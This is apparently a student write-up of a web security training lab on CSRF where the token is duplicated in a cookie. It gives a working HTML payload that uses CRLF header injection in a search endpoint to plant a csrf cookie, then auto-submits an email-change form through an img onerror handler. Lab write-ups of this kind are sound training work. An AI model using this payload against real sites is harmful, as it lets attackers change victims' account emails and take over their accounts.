# Lab: CSRF where token is duplicated in cookie

The vulnerability here is due to a bad configuration against CSRF attack. <br>
The application check if the token in the  cookie has the same value as the token in the form. <br>
If it is the case the application execute the desire action otherwise the application don't change the e-mail.<br>
```html
<form id="formulaire" name="change-email-form" action="https://MY-LAB.web-security-academy.net/my-account/change-email" method="POST">
    <input required type="email" name="email" value="wiener@thePirate">
    <input required type="hidden" name="csrf" value="jeyanthan">
</form>
<script>
    let myFormulaire = document.getElementById("formulaire");
</script>

<img src="https://MY-LAB.web-security-academy.net/?search=asdf%0d%0aset-cookie%3a%20csrf%3djeyanthan" onerror=myFormulaire.submit() >
```

The most important part of the payload is the image tag : <br>
-> the request is made  to : https://MY-LAB.web-security-academy.net/?search=asdf%0d%0aset-cookie%3a%20csrf%3djeyanthan <br>

There is a CR/LF vulnerability in the /?search endpoint in order to set our "csrf" cookie.  <br>
Now our victim has our "csrf" cookie as part of his cookies.<br>
Once the image tag failed to load the "image" our payload will send the form and the victim mail will change. <br>
